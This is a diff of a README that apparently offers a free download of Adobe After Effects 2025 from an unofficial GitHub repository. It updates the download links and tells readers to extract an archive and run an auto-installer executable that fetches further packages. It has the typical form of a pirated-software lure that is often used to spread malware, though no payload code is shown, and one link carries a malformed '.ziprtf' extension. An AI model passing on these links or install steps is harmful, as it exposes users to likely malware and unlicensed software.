@@ -14,15 +14,15 @@
     </tr>
     <tr>
         <td>Windows 64-bit</td>
-        <td><a href="https://github.com/FilimonServer/Adobe-After-Effects-2025/releases/download/v25.0/Installer_x64-x86.zip">Download</a></td>
+        <td><a href="https://github.com/FilimonServer/Adobe-After-Effects-2025/releases/download/v25.0.1/Adobe_After_Effects_x64-x86.ziprtf">Download</a></td>
     </tr>
     <tr>
         <td>Windows 32-bit</td>
-        <td><a href="https://github.com/FilimonServer/Adobe-After-Effects-2025/releases/download/v25.0/Installer_x64-x86.zip">Download</a></td>
+        <td><a href="https://github.com/FilimonServer/Adobe-After-Effects-2025/releases/download/v25.0.1/Adobe_After_Effects_x64-x86.zip">Download</a></td>
     </tr>
 </table>
 
-## **1. [Download the archive](https://github.com/FilimonServer/Adobe-After-Effects-2025/releases/download/v25.0/Installer_x64-x86.zip) and extract it to a convenient folder.**
+## **1. [Download the archive](https://github.com/FilimonServer/Adobe-After-Effects-2025/releases/download/v25.0.1/Adobe_After_Effects_x64-x86.zip) and extract it to a convenient folder.**
 ## **2. Run the auto-installer `Installing_x64_x86.exe`. It will install and download all necessary packages for > operation.**
 
 
